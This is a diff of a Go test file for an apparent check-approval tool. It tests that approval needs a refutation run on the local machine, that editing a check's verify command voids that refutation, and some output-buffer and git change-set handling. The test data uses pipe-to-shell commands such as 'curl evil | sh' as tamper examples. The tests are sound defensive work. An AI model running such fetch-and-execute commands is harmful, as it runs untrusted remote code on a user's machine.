@@ -26,21 +26,30 @@ func TestCandidates_RefuseForgedID(t *testing.T) {
 	assert.True(t, os.IsNotExist(statErr))
 }
 
-// H3: a hand-set awaiting_approval state without a surviving refutation by
-// another provider cannot be approved.
+// H3: refutations written into the candidate file are not trusted; only a
+// refutation this machine ran for exactly this content allows approval.
 func TestApprove_RequiresRealRefutation(t *testing.T) {
 	root := t.TempDir()
 	c := Candidate{ID: "CHK-001", State: StateAwaitingApproval, DraftedBy: "claude",
-		Check: Check{ID: "CHK-001", Mode: ModeObserve, When: When{Paths: []string{"**"}}, Verify: "curl x | sh", Sources: []string{"L-1"}, Created: "d"}}
+		Refutations: []Refutation{{Provider: "codex", Verdict: "survived"}},
+		Check:       Check{ID: "CHK-001", Mode: ModeObserve, When: When{Paths: []string{"**"}}, Verify: "curl x | sh", Sources: []string{"L-1"}, Created: "d"}}
 	require.NoError(t, SaveCandidate(root, c))
 	_, err := Approve(root, "CHK-001", testNow)
-	assert.Error(t, err)
-	c.Refutations = []Refutation{{Provider: "claude", Verdict: "survived"}}
-	require.NoError(t, SaveCandidate(root, c))
+	assert.ErrorContains(t, err, "no refutation run on this machine")
+
+	survive := func(context.Context, string, string) (string, error) { return "VERDICT: survived\nREASON: ok", nil }
+	got, err := Refute(context.Background(), root, c, []string{"claude", "codex"}, survive, testNow)
+	require.NoError(t, err)
+	assert.Equal(t, StateAwaitingApproval, got.State)
+
+	// Editing the verify command after the refutation voids it.
+	got.Check.Verify = "curl evil | sh"
+	require.NoError(t, SaveCandidate(root, got))
 	_, err = Approve(root, "CHK-001", testNow)
-	assert.Error(t, err, "the drafter's own verdict does not count")
-	c.Refutations = []Refutation{{Provider: "codex", Verdict: "survived"}}
-	require.NoError(t, SaveCandidate(root, c))
+	assert.ErrorContains(t, err, "changed after it was refuted")
+
+	got.Check.Verify = "curl x | sh"
+	require.NoError(t, SaveCandidate(root, got))
 	_, err = Approve(root, "CHK-001", testNow)
 	assert.NoError(t, err)
 }
@@ -114,4 +123,32 @@ func TestStatus_ReviewOnlyNotRetired(t *testing.T) {
 	assert.False(t, checkStatus(c, hits, 3).Retire)
 	c.Verify = "./x"
 	assert.True(t, checkStatus(c, hits, 3).Retire)
+}
+
+// N3: the report keeps the end of a long output, where a failure says why.
+func TestCappedBuffer_KeepsTail(t *testing.T) {
+	c := &cappedBuffer{limit: 10}
+	for i := 0; i < 100; i++ {
+		_, _ = c.Write([]byte("xxxxxxxxx\n"))
+	}
+	_, _ = c.Write([]byte("FAIL end\n"))
+	assert.Equal(t, "\nFAIL end\n", c.String()[len(c.String())-10:])
+	assert.LessOrEqual(t, len(c.String()), 10)
+}
+
+// N1: a change that adds a -diff attribute cannot hide its added lines, and
+// a binary file adds no lines.
+func TestCollectChangeSet_AttributesFromBase(t *testing.T) {
+	root, git := gitRepo(t)
+	writeT(t, root, ".gitattributes", "*.go -diff\n")
+	writeT(t, root, "src/a.go", "package a\nSECRET\n")
+	writeT(t, root, "blob.bin", "\x00\x01KEYWORD\x00")
+	git("add", "-A")
+	mb, err := MergeBase(root, "HEAD")
+	require.NoError(t, err)
+	cs, err := CollectChangeSet(root, mb)
+	require.NoError(t, err)
+	assert.Contains(t, cs.Added["src/a.go"], "SECRET")
+	assert.Empty(t, cs.Added["blob.bin"])
+	assert.Contains(t, cs.Paths, "blob.bin")
 }
